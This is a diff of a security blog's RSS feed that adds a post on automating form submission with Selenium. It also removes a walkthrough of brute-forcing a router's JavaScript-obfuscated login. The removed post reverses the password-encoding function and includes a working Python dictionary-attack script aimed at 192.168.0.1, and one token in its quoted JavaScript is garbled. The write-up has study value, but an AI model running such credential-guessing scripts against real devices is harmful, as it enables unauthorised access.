@@ -5,9 +5,49 @@
     <description>A blog about programming and network security</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Mon, 21 Aug 2017 15:11:48 +0800</pubDate>
-    <lastBuildDate>Mon, 21 Aug 2017 15:11:48 +0800</lastBuildDate>
+    <pubDate>Mon, 21 Aug 2017 16:10:33 +0800</pubDate>
+    <lastBuildDate>Mon, 21 Aug 2017 16:10:33 +0800</lastBuildDate>
     <generator>Jekyll v3.4.2</generator>
+    
+      <item>
+        <title>selenium自动提交表单方案</title>
+        <description>&lt;h3 id=&quot;refer&quot;&gt;Refer&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/wang02011/article/details/6299517&quot;&gt;常见的提交表单的方法&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/manors/archive/2010/03/11/1683727.html&quot;&gt;表单提交规则&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/32779563/how-can-i-click-submit-button&quot;&gt;selenium提交表单&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/17530104/selenium-webdriver-submit-vs-click&quot;&gt;selenium中click()和submit()的区别&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;利用selenium自动提交表单,要求能适应绝大多数的未知html情况下的提交,以便自动获取页面中的表单中的所有要提交的参
+数
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;
+
+&lt;p&gt;1.先判断html中form action所在行能不能通过selenium找到,也即这一行内容有id或name属性
+2.如果1失败再找&amp;lt;input.&lt;em&gt;type=(‘|”)?submit(‘|”)?.&lt;/em&gt;&amp;gt;的提交按钮,找到后用selenium的click()来提交
+3.目前这样做无法处理用图片提交的表单,后期视情况增加或不加&lt;/p&gt;
+</description>
+        <pubDate>Mon, 21 Aug 2017 00:00:00 +0800</pubDate>
+        <link>http://3xp10it.cc/web/2017/08/21/selenium%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%E6%96%B9%E6%A1%88/</link>
+        <guid isPermaLink="true">http://localhost:4000/web/2017/08/21/selenium%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%E6%96%B9%E6%A1%88/</guid>
+        
+        <category>python</category>
+        
+        <category>selenium</category>
+        
+        <category>form</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>sqlmap对状态码404处理的bug</title>
@@ -661,281 +701,6 @@ getActiveTab().then(showCookiesForTab);
         
         
         <category>auxilary</category>
-        
-      </item>
-    
-      <item>
-        <title>记一次js加密后的http暴破</title>
-        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;目的:爆破某个http登录页面
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.在登录页面填入123455提交后用burpsuite拦截,发现post数据如下:
-    {&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:{&quot;password&quot;:&quot;0KcgeXhc9TefbwK&quot;}}
-  说明浏览器加密表单中的密码字段后再提交,这样就不能直接用burpsuite等工具加载字典爆破了
-
-2.尝试找到加密的js
-    a)用chrome打开http://192.168.1.1登录页面,发现右键被禁用
-    b)打开开发者工具,按如下图1-5的顺序点击
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js1.png&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    c)在上一步最后的点击后看到的如下黄色高亮的那一行上单击左键(第2行)表示在这一行上下断点,下好断点后第2行会有蓝
-      色箭头出现表示已经下好断点在这行
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js2.png&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    d)先将所有的4行(断点在第2行)js整理下格式,在线整理js格式:
-        http://www.css88.com/tool/js_beautify/
-
-        整理后的js内容如下:
-        ---------------js----------------
-        function init() {
-            function f() {
-                setStyle(id(&quot;lgPwdNote&quot;), {
-                    visibility: &quot;visible&quot;
-                });
-                disInputTip($(&quot;#lgPwd ~ i.tip&quot;)[0], &quot;error&quot;)
-            }
-
-            function g(a) {
-                var d = &quot;16px&quot;,
-                    c = id(&quot;loginError&quot;);
-                switch (a) {
-                case ESYSLOCKEDFOREVER:
-                    window.top.location.reload();
-                    break;
-                case ESYSLOCKED:
-                    window.top.location.reload();
-                    break;
-                case EUNAUTH:
-                    a = $.authRltObj.time;
-                    a = void 0 == a ? e.cnt : a;
-                    if (e.cnt == a) break;
-                    a &amp;lt;= e.minTipCnt ? c.innerHTML = label.loginErrorTipH + a + label.loginErrorTipT : (c.innerHTML = label.loginPwdErr, d = &quot;35px&quot;);
-                    f();
-                    break;
-                case k:
-                    c.innerHTML = label.loginPwdErr;
-                    f();
-                    break;
-                case ESYSCLIENTFULL:
-                    b.disabled = !0, id(&quot;loginSub&quot;).disabled = !0, showCover(function (a) {
-                        var c;
-                        a.innerHTML = &quot;&amp;lt;p&amp;gt;&quot; + label.loginFull + &quot;&amp;lt;/p&amp;gt;&quot;;
-                        a = $(&quot;#Cover p&quot;);
-                        c = (document.documentElement.clientHeight - a[0].offsetHeight) / 2;
-                        a.css(&quot;marginTop&quot;, c - 0.3 * c)
-                    })
-                }
-                c.style.lineHeight = d;
-                0 &amp;lt; b.value.length &amp;amp;&amp;amp; setInputCursor(b)
-            }
-
-            function l() {
-                var a = id(&quot;loginFeg&quot;);
-                a.style.visibility = &quot;visible&quot; == a.style.visibility ? &quot;hidden&quot; : &quot;visible&quot;
-            }
-
-            function h() {
-                var a = id(&quot;lgPwd&quot;);
-                $.auth($.orgAuthPwd(a.value), function (b) {
-                    b == ENONE ? (a.value = &quot;&quot;, $.aundLg = !0, unloadLogin()) : g(parseInt(thRltObj.bHa$.authRltObj.code))
-                })
-            }
-            var k = &quot;PSWIlegal&quot;,
-                b = id(&quot;lgPwd&quot;),
-                e = {
-                    max: 1800,
-                    cnt: 20,
-                    minTipCnt: 3,
-                    timeout: 1E3
-                };
-            (function () {
-                var a = id(&quot;loginSub&quot;),
-                    d = id(&quot;pwdTipStr&quot;);
-                $(&quot;span.loginHelp&quot;)[0].onclick = l;
-                g(parseInt($.authRltObj.code));
-                a.onclick = h;
-                b.value = &quot;&quot;;
-                b.onkeyup = function (a) {
-                    a = a || window.event;
-                    if (13 == a.keyCode) return h()
-                };
-                b.onclick = function () {
-                    d.style.display = &quot;none&quot;
-                };
-                b.onblur = function () {
-                    0 == this.value.length &amp;amp;&amp;amp; (d.style.display = &quot;inline&quot;)
-                };
-                b.onkeydown = function (a) {
-                    setStyle(id(&quot;lgPwdNote&quot;), {
-                        visibility: &quot;hidden&quot;
-                    });
-                    disInputTip($(&quot;#lgPwd ~ i.tip&quot;)[0], &quot;null&quot;)
-                }
-            })()
-        }
-        init();
-        --------------end----------------
-    e)输入密码为123456后点击如下图中的暂停js执行按钮后再点击确定按钮
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js4.png&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    f)上一步中的确定按钮点击完成后点击下图中的step into next function按钮,点了2下就点不动了,变成了灰色
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js5.png&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    g)继续点暂停js执行按钮后再点确定,然后一直点step into next function按钮,点了10几下突然出现local变量
-    a:&quot;123456&quot;,这个正是在密码输入框输入的密码,这时js执行到function(a){return $.securityEncode(...)}这里,如下图:
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js6.png&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    h)这时再点step out of current function按钮再点step into next function突然出现a为加密后的变量,如下图
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/js7.png&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    i)说明关键的加密函数就是securityEncode,对应的局部代码为:
-    ---------------------js----------------------
-    securityEncode: function (a, b, c) {
-                var e = &quot;&quot;,
-                    f, g, h, k, l = 187,
-                    n = 187;
-                g = a.length;
-                h = b.length;
-                k = c.length;
-                f = g &amp;gt; h ? g : h;
-                for (var p = 0; p &amp;lt; f; p++) n = l = 187, p &amp;gt;= g ? n = b.charCodeAt(p) : p &amp;gt;= h ? l = a.charCodeAt(p) : (l = a.charCodeAt(p), n = b.charCodeAt(p)), e += c.charAt((l ^ n) % k);
-                return e
-            }, orgAuthPwd: function (a) {
-                return $.securityEncode(&quot;RDpbLfCPsJZ7fiv&quot;,
-                    a, &quot;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&quot;)
-            }
-    ---------------------js----------------------
-
-    人工转成python代码如下:
-    -----------------python----------------
-    def securityEncode(a,b,c):
-        e=&quot;&quot;
-        f=g=h=k=l=187
-        n=187
-        g=len(a)
-        h=len(b)
-        k=len(c)
-        if g&amp;gt;h:
-            f=g
-        else:
-            f=h
-        for p in range(0,f):
-            n=l=187
-            if p&amp;gt;=g:
-                n=ord(b[p])
-            else:
-                if p&amp;gt;=h:
-                    l=ord(a[p])
-                else:
-                    l=ord(a[p])
-                    n=ord(b[p])
-                e+=c[(l ^ n) % k]
-        return e
-    -----------------python----------------
-
-    最后写出爆破脚本如下:
-
-    ----------------crack.py----------------
-    import re
-    import time
-    import sys
-    from exp10it import post_requests
-    def securityEncode(a,b,c):
-        e=&quot;&quot;
-        f=g=h=k=l=187
-        n=187
-        g=len(a)
-        h=len(b)
-        k=len(c)
-        if g&amp;gt;h:
-            f=g
-        else:
-            f=h
-        for p in range(0,f):
-            n=l=187
-            if p&amp;gt;=g:
-                n=ord(b[p])
-            else:
-                if p&amp;gt;=h:
-                    l=ord(a[p])
-                else:
-                    l=ord(a[p])
-                    n=ord(b[p])
-                e+=c[(l ^ n) % k]
-        return e
-    def myEncode(a):
-        result=securityEncode(&quot;RDpbLfCPsJZ7fiv&quot;,a, &quot;yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW&quot;)
-        return result
-    dict=&quot;/var/root/mypypi/dicts/pass.txt&quot;
-    with open(dict,&quot;r+&quot;) as f:
-        i=0
-        for each in f:
-            time.sleep(0.5)
-            i+=1
-            mypass=re.sub(r&quot;\s$&quot;,&quot;&quot;,each)
-            mypass=myEncode(mypass)
-            data={&quot;method&quot;:&quot;do&quot;,&quot;login&quot;:{&quot;password&quot;:&quot;%s&quot; % mypass}}
-            #print(data)
-            resp=post_requests(&quot;http://192.168.0.1&quot;,data,{}).text
-            #print(dir(resp))
-            #print(resp.text)
-            sys.stdout.write(&quot;you tried:%d\r&quot; % i)
-            sys.stdout.flush()
-            if re.search(r&quot;error_code&quot;,resp):
-                continue
-            else:
-                print(&quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Congratulations!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;)
-                print(each)
-                break
-    ----------------crack.py----------------
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;0x02-attention&quot;&gt;0x02 Attention&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)这里有2个js转python的关键地方:
-1.js中的charCodeAt转成python为ord函数,eg:
-    b.charCodeAt(p)转成python为ord(b[p])
-2.js中的charAt转成python为数组取下标,eg:
-    c.charAt((l ^ n) % k)转成c[(l ^ n) % k]
-
-b)也可直接由python执行js,可参考:google.
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Wed, 24 May 2017 00:00:00 +0800</pubDate>
-        <link>http://3xp10it.cc/web/2017/05/24/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84http%E6%9A%B4%E7%A0%B4/</link>
-        <guid isPermaLink="true">http://localhost:4000/web/2017/05/24/%E8%AE%B0%E4%B8%80%E6%AC%A1js%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84http%E6%9A%B4%E7%A0%B4/</guid>
-        
-        <category>js</category>
-        
-        <category>crack</category>
-        
-        
-        <category>web</category>
         
       </item>
     
